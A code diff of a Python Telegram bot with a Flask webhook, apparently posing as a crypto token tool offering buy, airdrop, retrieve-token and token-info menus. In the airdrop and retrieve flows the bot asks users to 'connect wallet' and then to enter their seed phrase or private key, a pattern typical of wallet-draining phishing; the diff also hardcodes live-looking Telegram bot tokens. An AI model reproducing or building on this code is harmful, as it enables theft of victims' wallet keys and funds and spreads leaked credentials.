@@ -8,19 +8,18 @@ from telegram import (
     Update,
     InlineKeyboardButton,
     InlineKeyboardMarkup,
-    BotCommand
 )
 from telegram.ext import (
-    ApplicationBuilder,
-    ContextTypes,
+    Application,
     CommandHandler,
     CallbackQueryHandler,
     MessageHandler,
-    filters
+    ContextTypes,
+    filters,
 )
 
 # ---------------- CONFIG ----------------
-BOT_TOKEN = "8585187554:AAH5Zf7FwodvJEBp14NYfR8LK2M8HGWBeN8"
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8585187554:AAE2ty-zhTgIrZdthOMOZ89DJPRjtQ9utaY")
 API_URL = "https://api.dexscreener.com/latest/dex/tokens/"
 
 # ---------------- EMAIL CONFIG ---------------- 
@@ -88,19 +87,14 @@ def get_main_menu():
         [InlineKeyboardButton("Help", callback_data="help")]
     ])
 
-# ---------------- START COMMAND ----------------
+# ---------------- START ----------------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_name = update.message.from_user.first_name
-
     welcome_text = (
         f"👋 Welcome, {user_name}!\n\n"
         "Use the menu below to get started."
     )
-
-    await update.message.reply_text(
-        welcome_text,
-        reply_markup=get_main_menu()
-    )
+    await update.message.reply_text(welcome_text, reply_markup=get_main_menu())
 
 # ---------------- BUTTON HANDLER ----------------
 async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -135,7 +129,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_input = update.message.text.strip()
     user_id = update.message.from_user.id
 
-    # BUY TOKEN
     if step == "buy_contract":
         msg, _ = get_token_info(user_input)
         if "❌" in msg:
@@ -170,7 +163,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data.clear()
         return
 
-    # AIRDROP
     if step == "airdrop_address":
         await update.message.reply_text(
             "Connect wallet:",
@@ -187,7 +179,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data.clear()
         return
 
-    # RETRIEVE TOKEN
     if step == "retrieve_contract":
         await update.message.reply_text(
             "Connect wallet:",
@@ -204,14 +195,13 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data.clear()
         return
 
-    # INFO
     if step == "info":
         msg, _ = get_token_info(user_input)
         await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=get_main_menu())
         context.user_data.clear()
         return
 
-# ---------------- CONNECT WALLET ----------------
+# ---------------- CONNECT WALLET BUTTONS ----------------
 async def connect_wallet_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -229,35 +219,34 @@ async def connect_wallet_buttons(update: Update, context: ContextTypes.DEFAULT_T
         context.user_data["awaiting_wallet_input"] = "retrieve"
         await query.message.reply_text("Enter your seed phrase/private key:")
 
-# ---------------- MAIN APP + WEBHOOK SERVER ----------------
+# ---------------- FLASK + TELEGRAM APP ----------------
 app = Flask(__name__)
+telegram_app = Application.builder().token(BOT_TOKEN).build()
 
-tg_app = ApplicationBuilder().token(BOT_TOKEN).build()
+telegram_app.add_handler(CommandHandler("start", start))
+telegram_app.add_handler(CallbackQueryHandler(connect_wallet_buttons, pattern="connect_wallet_"))
+telegram_app.add_handler(CallbackQueryHandler(button))
+telegram_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
 
-# Register handlers
-tg_app.add_handler(CommandHandler("start", start))
-tg_app.add_handler(CommandHandler("buy", start))
-tg_app.add_handler(CallbackQueryHandler(connect_wallet_buttons, pattern="connect_wallet_"))
-tg_app.add_handler(CallbackQueryHandler(button))
-tg_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-
-# Telegram webhook route
-@app.post("/webhook")
+# ---------------- WEBHOOK ENDPOINT ----------------
+@app.post(f"/{BOT_TOKEN}")
 async def webhook():
     try:
         data = request.get_json(force=True)
-        update = Update.de_json(data, tg_app.bot)
-        await tg_app.process_update(update)
+        update = Update.de_json(data, telegram_app.bot)
+        await telegram_app.process_update(update)
     except Exception as e:
         print("Webhook error:", e)
     return "OK"
 
-# root (optional)
 @app.get("/")
 def home():
     return "Bot is running."
 
-# Run Flask server
+# ---------------- MAIN ----------------
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host="0.0.0.0", port=port)
+    telegram_app.run_webhook(
+        listen="0.0.0.0",
+        port=int(os.environ.get("PORT", 5000)),
+        url_path=BOT_TOKEN
+    )
